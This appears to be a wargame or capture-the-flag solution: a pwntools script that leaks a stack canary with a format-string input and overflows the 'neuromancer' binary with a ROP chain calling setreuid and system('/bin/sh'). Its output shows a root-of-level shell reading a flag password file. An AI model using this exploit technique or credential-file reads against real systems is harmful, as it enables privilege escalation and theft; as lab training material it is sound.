```python
from pwn import *

elf = context.binary = ELF('./neuromancer')
p = process('./neuromancer')

p.sendlineafter(b"[NEUROMANCER] Console handle: ", b'%15$p')
p.recvuntil(b'[NEUROMANCER] Trace echo: ')
rep = p.recvline().strip()
canary = int(rep, 16)
print(hex(canary))

payload = b"A" * 136
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1026)             # uid de flag07
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1026)             # uid de flag07
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
payload += b"\n"

p.sendafter(b"[NEUROMANCER] Interface: ", payload)

p.interactive()

```

```bash
python3 test.py
[*] '/home/level09/neuromancer'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './neuromancer': pid 948
0x823aecf4d02a3900
[*] Switching to interactive mode
[NEUROMANCER] Unknown command.
$ whoami
flag09
$ cat /home/flag09/.pass
kl9th7ox72218n3jlf554eymtlaynogo
$ 

```
Got it !